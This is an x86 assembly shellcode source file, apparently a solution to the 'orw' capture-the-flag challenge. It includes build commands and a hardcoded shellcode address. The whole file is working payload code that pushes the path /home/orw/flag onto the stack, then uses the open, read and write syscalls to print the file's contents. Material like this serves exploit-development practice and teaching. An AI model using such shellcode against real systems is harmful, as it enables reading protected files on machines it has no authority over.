; to assemble, run "nasm shellcode.asm -o shellcode.o -felf32 && objcopy -j .text -O binary -I elf32-little shellcode.o shellcode"
; shellcode addr = 0x804a060

add [eax], dl ; first byte is set to 00, so this acts as a padding

; open, we need to open the file to get the fd
; first we push the string "/home/orw/flag"

push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f

mov eax, 5
mov ebx, esp
mov ecx, 0
xor edx, edx
int 0x80

; read, we need to read the file to the stack
mov ebx, eax
mov eax, 3
mov ecx, esp
mov edx, 40
int 0x80

; write, write the file contents to stdout
mov eax, 4
mov ebx, 1
mov ecx, esp
mov edx, 40
int 0x80